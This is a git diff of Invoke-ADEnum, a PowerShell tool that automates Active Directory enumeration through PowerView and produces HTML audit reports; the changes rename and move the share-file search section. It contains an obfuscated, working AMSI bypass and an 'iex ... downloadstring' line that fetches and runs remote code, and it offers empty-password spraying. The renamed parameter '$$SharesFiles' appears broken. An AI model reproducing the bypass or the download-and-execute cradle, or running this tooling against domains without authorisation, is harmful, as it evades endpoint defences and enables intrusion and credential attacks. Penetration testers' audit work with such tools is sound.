@@ -1,18 +1,18 @@
-<#
-
-.SYNOPSIS
-Invoke-ADEnum Author: Rob LP (@L3o4j)
-
-.DESCRIPTION
-Automate Active Directory Enumeration
-Required Dependencies: PowerView
-URL: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
-PowerView Author: Will Schroeder (@harmj0y)
-
-#>
-
 function Invoke-ADEnum
 {
+
+	<#
+
+	.SYNOPSIS
+	Invoke-ADEnum Author: Rob LP (@L3o4j)
+	
+	.DESCRIPTION
+	Automate Active Directory Enumeration
+	Required Dependencies: PowerView
+	URL: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+	PowerView Author: Will Schroeder (@harmj0y)
+	
+	#>
 	
     [CmdletBinding()] Param(
 
@@ -58,7 +58,7 @@ function Invoke-ADEnum
         
         [Parameter (Mandatory=$False, Position = 10, ValueFromPipeline=$true)]
         [Switch]
-        $Shares,
+        $$SharesFiles,
         
         [Parameter (Mandatory=$False, Position = 11, ValueFromPipeline=$true)]
         [Switch]
@@ -197,8 +197,7 @@ function Invoke-ADEnum
 			
 			else{
 				try{
-					if($NoBypass){}
-					else{S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )}
+					if(!$NoBypass){S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )}
 					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/PowerView_Mod.ps1')
 				}
 				catch{
@@ -212,11 +211,9 @@ function Invoke-ADEnum
 		}
 		
 		if($Domain){
-			if($Server){}
-			else{
+			if(!$Server){
 				$Server = Get-DomainController -Domain $Domain | Where-Object {$_.Roles -like "RidRole"} | Select-Object -ExpandProperty Name
-				if($Server){}
-				else{$Server = Read-Host "Enter the DC FQDN"}
+				if(!$Server){$Server = Read-Host "Enter the DC FQDN"}
 			}
 		}
 
@@ -327,7 +324,7 @@ function Invoke-ADEnum
 
  -SecurityGroups		Enumerate for Security Groups (e.g.: Account Operators, Server Operators, and more...)
  
- -Shares			Enumerate for Shares and Files (slow)
+ -SharesFiles			Enumerate for Files in Shares (slow)
 
  -SprayEmptyPasswords		Sprays Empty Passwords - counts towards Bad-Pwd-Count
  
@@ -3107,52 +3104,6 @@ function Invoke-ADEnum
 		$TempSubnets | Sort-Object -Unique Domain,Site | Format-Table -AutoSize -Wrap
 		$HTMLSubnets = $TempSubnets | Sort-Object -Unique Domain,Site | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='Subnets'>Subnets</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='Subnets'>" }
 	}
-
- 	<#
-	############################################################
-    ############# Current User Group Membership ################
-	############################################################
-	
-	Write-Host ""
-    Write-Host "Groups the current user is part of:" -ForegroundColor Cyan
-    Write-Host ""
-    Write-Host "Current User: $env:USERNAME"
-    if($Domain -AND $Server) {
-		$GetCurrUserGroups = Get-DomainGroup -Domain $Domain -Server $Server -UserName $env:USERNAME | Where-Object { $_.samaccountname -notlike "Domain Users" }
-    		$TempGetCurrUserGroup = foreach($GetCurrUserGroup in $GetCurrUserGroups){
-			[PSCustomObject]@{
-				"Group Name" = $GetCurrUserGroup.samaccountname
-				"Object SID" = $GetCurrUserGroup.objectsid
-				Domain = $Domain
-				#"Members of this group (Users)" = ((Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse -Identity $GetCurrUserGroup.samaccountname).MemberName | Sort-Object -Unique) -join ' - '
-			}
-		}
-		
-		if($TempGetCurrUserGroup){
-			$TempGetCurrUserGroup | Sort-Object Domain,"Group Name" | ft -Autosize -Wrap
-			$HTMLGetCurrUserGroup = $TempGetCurrUserGroup | Sort-Object Domain,"Group Name" | ConvertTo-Html -Fragment -PreContent "<h2>Groups the current user is part of</h2>"
-		}
-    }
-    else{
-    	$TempGetCurrUserGroup = foreach($AllDomain in $AllDomains){
-			$GetCurrUserGroups = Get-DomainGroup -Domain $AllDomain -UserName $env:USERNAME | Where-Object { $_.samaccountname -notlike "Domain Users" }
-			foreach($GetCurrUserGroup in $GetCurrUserGroups){
-				[PSCustomObject]@{
-					"Group Name" = $GetCurrUserGroup.samaccountname
-					"Object SID" = $GetCurrUserGroup.objectsid
-					Domain = $AllDomain
-					#"Members of this group" = ((Get-DomainGroupMember -Domain $AllDomain -Recurse -Identity $GetCurrUserGroup.samaccountname).MemberName | Sort-Object -Unique) -join ' - '
-				}
-			}
-		}
-		
-		if($TempGetCurrUserGroup){
-			$TempGetCurrUserGroup | Sort-Object Domain,"Group Name" | ft -Autosize -Wrap
-			$HTMLGetCurrUserGroup = $TempGetCurrUserGroup | Sort-Object Domain,"Group Name" | ConvertTo-Html -Fragment -PreContent "<h2>Groups the current user is part of</h2>"
-		}
-    }
-
-    #>
 	
 	$MisconfigurationsBanner = "<h3>Configuration Flaws with Potential for Exploitation</h3>"
 	Write-Host ""
@@ -5712,8 +5663,8 @@ function Invoke-ADEnum
 	}
 
  	if ($LinkedDAAccounts) {
-		$LinkedDAAccounts | Sort-Object Domain,Account,"Display Name" | Format-Table -AutoSize -Wrap
-		$HTMLLinkedDAAccounts = $LinkedDAAccounts | Sort-Object Domain,Account,"Display Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='LinkedDAAccounts'>Linked DA accounts using name correlation</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='LinkedDAAccounts'>" }
+		$LinkedDAAccounts | Sort-Object -Unique Domain,Account,"Display Name" | Format-Table -AutoSize -Wrap
+		$HTMLLinkedDAAccounts = $LinkedDAAccounts | Sort-Object -Unique Domain,Account,"Display Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='LinkedDAAccounts'>Linked DA accounts using name correlation</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='LinkedDAAccounts'>" }
 	}
 	
 	#######################################
@@ -6727,110 +6678,8 @@ function Invoke-ADEnum
 		$TempDomainOUsByKeyword | Sort-Object Domain,Keyword,Name | Format-Table -AutoSize -Wrap
 		$HTMLDomainOUsByKeyword = $TempDomainOUsByKeyword | Sort-Object Domain,Keyword,Name | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='DomainOUsByKeyword'>Interesting OUs (by Keyword)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='DomainOUsByKeyword'>" }
 	}
-	
-	#######################################
-    ######### Domain Shares ###############
-	#######################################
-	
-	if($Shares -OR $AllEnum){
-        	Write-Host ""
-		Write-Host "Accessible Domain Shares:" -ForegroundColor Cyan
-		if ($Domain -and $Server) {
-			$DomainShares = Find-DomainShare -ComputerDomain $Domain -Server $Server -CheckShareAccess -Threads 100 -Delay 1
-			$TempDomainShares = foreach ($DomainShare in $DomainShares) {
-				[PSCustomObject]@{
-					"Name" = $DomainShare.Name
-					"Computer Name" = $DomainShare.ComputerName
-					"Remark" = $DomainShare.Remark
-					Domain = $Domain
-				}
-			}
-		}
-		
-		else {
-			$TempDomainShares = foreach ($AllDomain in $AllDomains) {
-				$DomainShares = Find-DomainShare -ComputerDomain $AllDomain -CheckShareAccess -Threads 100 -Delay 1
-				foreach ($DomainShare in $DomainShares) {
-					[PSCustomObject]@{
-						"Name" = $DomainShare.Name
-						"Computer Name" = $DomainShare.ComputerName
-						"Remark" = $DomainShare.Remark
-						Domain = $AllDomain
-					}
-				}
-			}
-		}
 
-  		if ($TempDomainShares) {
-			$TempDomainShares | Sort-Object Domain,"Computer Name",Name | Format-Table -AutoSize -Wrap
-			$HTMLDomainShares = $TempDomainShares | Sort-Object Domain,"Computer Name",Name | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='DomainShares'>Accessible Domain Shares</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='DomainShares'>" }
-		}
-
-
-        	Write-Host ""
-		Write-Host "Domain Share Files:" -ForegroundColor Cyan
-		if($Domain -AND $Server) {
-			$DomainShareFiles = Find-InterestingDomainShareFile -Server $Server -Threads 100 -Delay 1 | Select Owner,CreationTime,LastAccessTime,LastWriteTime,Path
-			$TempDomainShareFiles = foreach ($DomainShareFile in $DomainShareFiles) {
-				[PSCustomObject]@{
-					"Owner" = $DomainShareFile.Owner
-					"Path" = $DomainShareFile.Path
-					"Domain" = $Domain
-				}
-			}
-		}
-		else{
-			$TempDomainShareFiles = foreach($AllDomain in $AllDomains){
-				$DomainShareFiles = Find-InterestingDomainShareFile -ComputerDomain $AllDomain -Threads 100 -Delay 1 | Select Owner,CreationTime,LastAccessTime,LastWriteTime,Path
-				foreach($DomainShareFile in $DomainShareFiles){
-					[PSCustomObject]@{
-						"Owner" = $DomainShareFile.Owner
-						"Path" = $DomainShareFile.Path
-						"Domain" = $AllDomain
-					}
-				}
-			}
-		}
-
-  		if($TempDomainShareFiles){
-			$TempDomainShareFiles | Sort-Object Domain,Owner,Path | Format-Table -AutoSize -Wrap
-			$HTMLDomainShareFiles = $TempDomainShareFiles | Sort-Object Domain,Owner,Path | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='DomainShareFiles'>Domain Share Files</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='DomainShareFiles'>" }
-		}
-
-        
-        	Write-Host ""
-		Write-Host "Domain Share Files (more file extensions):" -ForegroundColor Cyan
-		if ($Domain -and $Server) {
-			$InterestingFiles = Find-InterestingDomainShareFile -Server $Server -Include *.doc*, *.txt*, *.xls*, *.csv, *.ppt*, *.msi*, *.wim* -Threads 100 -Delay 1 
-			$TempInterestingFiles = foreach ($File in $InterestingFiles) {
-				[PSCustomObject]@{
-					"Owner" = $File.Owner
-					"Path" = $File.Path
-					"Domain" = $Domain
-				}
-			}
-		}
-		else {
-			$TempInterestingFiles = foreach ($AllDomain in $AllDomains) {
-				$InterestingFiles = Find-InterestingDomainShareFile -ComputerDomain $AllDomain -Include *.doc*, *.txt*, *.xls*, *.csv, *.ppt*, *.msi*, *.wim* -Threads 100 -Delay 1
-				foreach ($File in $InterestingFiles) {
-					[PSCustomObject]@{
-						"Owner" = $File.Owner
-						"Path" = $File.Path
-						"Domain" = $AllDomain
-					}
-				}
-			}
-		}
-
-  		if ($TempInterestingFiles) {
-			$TempInterestingFiles | Sort-Object Domain,Owner,Path | Format-Table -AutoSize -Wrap
-			$HTMLInterestingFiles = $TempInterestingFiles | Sort-Object Domain,Owner,Path | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='InterestingFiles'>Domain Share Files (more file extensions)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='InterestingFiles'>" }
-		}
-
-    	}
-
-     	####################################################
+ 	####################################################
     ######### Readable Writable Shares ###############
 	####################################################
 	
@@ -6898,6 +6747,75 @@ function Invoke-ADEnum
 		$SharesResultsTable | Sort-Object -Unique "Domain","Writable","Targets","Share Name" | Format-Table -AutoSize -Wrap
 		$HTMLSharesResultsTable = $SharesResultsTable | Sort-Object -Unique "Domain","Writable","Targets","Share Name" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='RWShares'>Readable and Writable Shares</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='RWShares'>" }
 	}
+	
+	#######################################
+    ######### Domain Shares Files ###############
+	#######################################
+	
+	if($SharesFiles -OR $AllEnum){
+        	
+        	Write-Host ""
+		Write-Host "Domain Share Files:" -ForegroundColor Cyan
+		if($Domain -AND $Server) {
+			$DomainShareFiles = Find-InterestingDomainShareFile -Server $Server -Threads 100 -Delay 1 | Select Owner,CreationTime,LastAccessTime,LastWriteTime,Path
+			$TempDomainShareFiles = foreach ($DomainShareFile in $DomainShareFiles) {
+				[PSCustomObject]@{
+					"Owner" = $DomainShareFile.Owner
+					"Path" = $DomainShareFile.Path
+					"Domain" = $Domain
+				}
+			}
+		}
+		else{
+			$TempDomainShareFiles = foreach($AllDomain in $AllDomains){
+				$DomainShareFiles = Find-InterestingDomainShareFile -ComputerDomain $AllDomain -Threads 100 -Delay 1 | Select Owner,CreationTime,LastAccessTime,LastWriteTime,Path
+				foreach($DomainShareFile in $DomainShareFiles){
+					[PSCustomObject]@{
+						"Owner" = $DomainShareFile.Owner
+						"Path" = $DomainShareFile.Path
+						"Domain" = $AllDomain
+					}
+				}
+			}
+		}
+
+  		if($TempDomainShareFiles){
+			$TempDomainShareFiles | Sort-Object Domain,Owner,Path | Format-Table -AutoSize -Wrap
+			$HTMLDomainShareFiles = $TempDomainShareFiles | Sort-Object Domain,Owner,Path | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='DomainShareFiles'>Domain Share Files</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='DomainShareFiles'>" }
+		}
+
+        
+        	Write-Host ""
+		Write-Host "Domain Share Files (more file extensions):" -ForegroundColor Cyan
+		if ($Domain -and $Server) {
+			$InterestingFiles = Find-InterestingDomainShareFile -Server $Server -Include *.doc*, *.txt*, *.xls*, *.csv, *.ppt*, *.msi*, *.wim* -Threads 100 -Delay 1 
+			$TempInterestingFiles = foreach ($File in $InterestingFiles) {
+				[PSCustomObject]@{
+					"Owner" = $File.Owner
+					"Path" = $File.Path
+					"Domain" = $Domain
+				}
+			}
+		}
+		else {
+			$TempInterestingFiles = foreach ($AllDomain in $AllDomains) {
+				$InterestingFiles = Find-InterestingDomainShareFile -ComputerDomain $AllDomain -Include *.doc*, *.txt*, *.xls*, *.csv, *.ppt*, *.msi*, *.wim* -Threads 100 -Delay 1
+				foreach ($File in $InterestingFiles) {
+					[PSCustomObject]@{
+						"Owner" = $File.Owner
+						"Path" = $File.Path
+						"Domain" = $AllDomain
+					}
+				}
+			}
+		}
+
+  		if ($TempInterestingFiles) {
+			$TempInterestingFiles | Sort-Object Domain,Owner,Path | Format-Table -AutoSize -Wrap
+			$HTMLInterestingFiles = $TempInterestingFiles | Sort-Object Domain,Owner,Path | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='InterestingFiles'>Domain Share Files (more file extensions)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='InterestingFiles'>" }
+		}
+
+    	}
 	
 	#####################################
     ######### Domain ACLs ###############
@@ -7739,7 +7657,7 @@ function Invoke-ADEnum
     # Stop capturing the output and display it on the console
     Stop-Transcript | Out-Null
 	
-	$Report = ConvertTo-HTML -Body "$TopLevelBanner $HTMLEnvironmentTable $HTMLTargetDomain $HTMLKrbtgtAccount $HTMLdc $HTMLParentandChildDomains $HTMLDomainSIDsTable $HTMLForestDomain $HTMLForestGlobalCatalog $HTMLGetDomainTrust $HTMLTrustAccounts $HTMLTrustedDomainObjectGUIDs $HTMLGetDomainForeignGroupMember $HTMLBuiltInAdministrators $HTMLEnterpriseAdmins $HTMLDomainAdmins $HTMLAccountOperators $HTMLBackupOperators $HTMLCertPublishersGroup $HTMLDNSAdmins $HTMLEnterpriseKeyAdmins $HTMLEnterpriseRODCs $HTMLGPCreatorOwners $HTMLKeyAdmins $HTMLProtectedUsers $HTMLRODCs $HTMLSchemaAdmins $HTMLServerOperators $HTMLGetCurrUserGroup $HTMLSubnets $MisconfigurationsBanner $HTMLCertPublishers $HTMLVulnCertTemplates $HTMLVulnCertComputers $HTMLVulnCertUsers $HTMLUnconstrained $HTMLConstrainedDelegationComputers $HTMLConstrainedDelegationUsers $HTMLRBACDObjects $HTMLADComputersCreated $HTMLPasswordSetUsers $HTMLUnixPasswordSet $HTMLEmptyPasswordUsers $HTMLTotalEmptyPass $HTMLPreWin2kCompatibleAccess $HTMLUnsupportedHosts $HTMLLMCompatibilityLevel $HTMLMachineQuota $InterestingDataBanner $HTMLReplicationUsers $HTMLExchangeTrustedSubsystem $HTMLServiceAccounts $HTMLGMSAs $HTMLnopreauthset $HTMLUsersAdminCount $HTMLGroupsAdminCount $HTMLAdminsInProtectedUsersGroup $HTMLNotSensitiveAdminsInProtectedUsersGroup $HTMLAdminsNotInProtectedUsersGroup $HTMLAdminsNOTinProtectedUsersGroupAndNOTSensitive $HTMLNonAdminsInProtectedUsersGroup $HTMLPrivilegedSensitiveUsers $HTMLPrivilegedNotSensitiveUsers $HTMLNonPrivilegedSensitiveUsers $HTMLMachineAccountsPriv $HTMLsidHistoryUsers $HTMLRevEncUsers $HTMLLinkedDAAccounts $HTMLGPOCreators $HTMLGPOsWhocanmodify $HTMLGpoLinkResults $HTMLLAPSGPOs $HTMLLAPSAdminGPOs $HTMLLAPSCanRead $HTMLLAPSExtended $HTMLLapsEnabledComputers $HTMLAppLockerGPOs $HTMLGPOLocalGroupsMembership $HTMLGPOComputerAdmins $HTMLGPOMachinesAdminlocalgroup $HTMLUsersInGroup $HTMLFindLocalAdminAccess $HTMLFindDomainUserLocation $HTMLLoggedOnUsersServerOU $HTMLWin7AndServer2008 $HTMLInterestingServersEnabled $HTMLKeywordDomainGPOs $HTMLGroupsByKeyword $HTMLDomainOUsByKeyword $HTMLDomainShares $HTMLDomainShareFiles $HTMLInterestingFiles $HTMLSharesResultsTable $HTMLACLScannerResults $AnalysisBanner $HTMLDomainPolicy $HTMLKerberosPolicy $HTMLUserAccountAnalysis $HTMLComputerAccountAnalysis $HTMLOperatingSystemsAnalysis $HTMLServersEnabled $HTMLServersDisabled $HTMLWorkstationsEnabled $HTMLWorkstationsDisabled $HTMLEnabledUsers $HTMLDisabledUsers $HTMLOtherGroups $HTMLDomainGPOs $HTMLAllDomainOUs $HTMLAllDescriptions" -Title "Active Directory Audit" -Head $header
+	$Report = ConvertTo-HTML -Body "$TopLevelBanner $HTMLEnvironmentTable $HTMLTargetDomain $HTMLKrbtgtAccount $HTMLdc $HTMLParentandChildDomains $HTMLDomainSIDsTable $HTMLForestDomain $HTMLForestGlobalCatalog $HTMLGetDomainTrust $HTMLTrustAccounts $HTMLTrustedDomainObjectGUIDs $HTMLGetDomainForeignGroupMember $HTMLBuiltInAdministrators $HTMLEnterpriseAdmins $HTMLDomainAdmins $HTMLAccountOperators $HTMLBackupOperators $HTMLCertPublishersGroup $HTMLDNSAdmins $HTMLEnterpriseKeyAdmins $HTMLEnterpriseRODCs $HTMLGPCreatorOwners $HTMLKeyAdmins $HTMLProtectedUsers $HTMLRODCs $HTMLSchemaAdmins $HTMLServerOperators $HTMLSubnets $MisconfigurationsBanner $HTMLCertPublishers $HTMLVulnCertTemplates $HTMLVulnCertComputers $HTMLVulnCertUsers $HTMLUnconstrained $HTMLConstrainedDelegationComputers $HTMLConstrainedDelegationUsers $HTMLRBACDObjects $HTMLADComputersCreated $HTMLPasswordSetUsers $HTMLUnixPasswordSet $HTMLEmptyPasswordUsers $HTMLTotalEmptyPass $HTMLPreWin2kCompatibleAccess $HTMLUnsupportedHosts $HTMLLMCompatibilityLevel $HTMLMachineQuota $InterestingDataBanner $HTMLReplicationUsers $HTMLExchangeTrustedSubsystem $HTMLServiceAccounts $HTMLGMSAs $HTMLnopreauthset $HTMLUsersAdminCount $HTMLGroupsAdminCount $HTMLAdminsInProtectedUsersGroup $HTMLNotSensitiveAdminsInProtectedUsersGroup $HTMLAdminsNotInProtectedUsersGroup $HTMLAdminsNOTinProtectedUsersGroupAndNOTSensitive $HTMLNonAdminsInProtectedUsersGroup $HTMLPrivilegedSensitiveUsers $HTMLPrivilegedNotSensitiveUsers $HTMLNonPrivilegedSensitiveUsers $HTMLMachineAccountsPriv $HTMLsidHistoryUsers $HTMLRevEncUsers $HTMLLinkedDAAccounts $HTMLGPOCreators $HTMLGPOsWhocanmodify $HTMLGpoLinkResults $HTMLLAPSGPOs $HTMLLAPSAdminGPOs $HTMLLAPSCanRead $HTMLLAPSExtended $HTMLLapsEnabledComputers $HTMLAppLockerGPOs $HTMLGPOLocalGroupsMembership $HTMLGPOComputerAdmins $HTMLGPOMachinesAdminlocalgroup $HTMLUsersInGroup $HTMLFindLocalAdminAccess $HTMLFindDomainUserLocation $HTMLLoggedOnUsersServerOU $HTMLWin7AndServer2008 $HTMLInterestingServersEnabled $HTMLKeywordDomainGPOs $HTMLGroupsByKeyword $HTMLDomainOUsByKeyword $HTMLSharesResultsTable $HTMLDomainShareFiles $HTMLInterestingFiles $HTMLACLScannerResults $AnalysisBanner $HTMLDomainPolicy $HTMLKerberosPolicy $HTMLUserAccountAnalysis $HTMLComputerAccountAnalysis $HTMLOperatingSystemsAnalysis $HTMLServersEnabled $HTMLServersDisabled $HTMLWorkstationsEnabled $HTMLWorkstationsDisabled $HTMLEnabledUsers $HTMLDisabledUsers $HTMLOtherGroups $HTMLDomainGPOs $HTMLAllDomainOUs $HTMLAllDescriptions" -Title "Active Directory Audit" -Head $header
 	$ClientReport = ConvertTo-HTML -Body "$TopLevelBanner $HTMLEnvironmentTable $HTMLTargetDomain $HTMLKrbtgtAccount $HTMLdc $HTMLParentandChildDomains $HTMLForestDomain $HTMLForestGlobalCatalog $HTMLGetDomainTrust $HTMLTrustAccounts $HTMLTrustedDomainObjectGUIDs $HTMLGetDomainForeignGroupMember $HTMLBuiltInAdministrators $HTMLEnterpriseAdmins $HTMLDomainAdmins $HTMLSubnets $MisconfigurationsBanner $HTMLCertPublishers $HTMLADCSEndpointsTable $HTMLVulnCertTemplates $HTMLVulnCertComputers $HTMLVulnCertUsers $HTMLCertTemplatesTable $HTMLUnconstrained $HTMLUnconstrainedTable $HTMLConstrainedDelegationComputers $HTMLConstrainedDelegationComputersTable $HTMLConstrainedDelegationUsers $HTMLConstrainedDelegationUsersTable $HTMLRBACDObjects $HTMLRBCDTable $HTMLADComputersCreated $HTMLADComputersCreatedTable $HTMLPasswordSetUsers $HTMLUserPasswordsSetTable $HTMLUnixPasswordSet $HTMLUnixPasswordSetTable $HTMLEmptyPasswordUsers $HTMLEmptyPasswordsTable $HTMLTotalEmptyPass $HTMLTotalEmptyPassTable $HTMLPreWin2kCompatibleAccess $HTMLPreWindows2000Table $HTMLUnsupportedHosts $HTMLUnsupportedOSTable $HTMLLMCompatibilityLevel $HTMLLMCompatibilityLevelTable $HTMLMachineQuota $HTMLMachineAccountQuotaTable $InterestingDataBanner $HTMLReplicationUsers $HTMLDCsyncPrincipalsTable $HTMLServiceAccounts $HTMLServiceAccountsTable $HTMLGMSAs $HTMLGMSAServiceAccountsTable $HTMLnopreauthset $HTMLNoPreauthenticationTable $HTMLUsersAdminCount $HTMLAdminCountUsersTable $HTMLGroupsAdminCount $HTMLAdminCountGroupsTable $HTMLAdminsNotInProtectedUsersGroup $HTMLAdminsNOTinProtectedUsersGroupTable $HTMLAdminsNOTinProtectedUsersGroupAndNOTSensitive $HTMLAdminsNOTinProtectedUsersGroupAndNOTSensitiveTable $HTMLPrivilegedNotSensitiveUsers $HTMLPrivilegedNOTSensitiveDelegationTable $HTMLMachineAccountsPriv $HTMLMachineAccountsPrivilegedGroupsTable $HTMLsidHistoryUsers $HTMLSDIHistorysetTable $HTMLRevEncUsers $HTMLReversibleEncryptionTable $HTMLSharesResultsTable $AnalysisBanner $HTMLDomainPolicy $HTMLKerberosPolicy $HTMLUserAccountAnalysis $HTMLUserAccountAnalysisTable $HTMLComputerAccountAnalysis $HTMLComputerAccountAnalysisTable $HTMLOperatingSystemsAnalysis $HTMLServersDisabled $HTMLWorkstationsDisabled $HTMLDisabledUsers" -Title "Active Directory Audit" -Head $header
  	$HTMLOutputFilePath = $OutputFilePath.Replace(".txt", ".html")
   	$HTMLClientOutputFilePath = $HTMLOutputFilePath.Replace("Invoke-ADEnum", "Invoke-ADEnum_Client-Report")
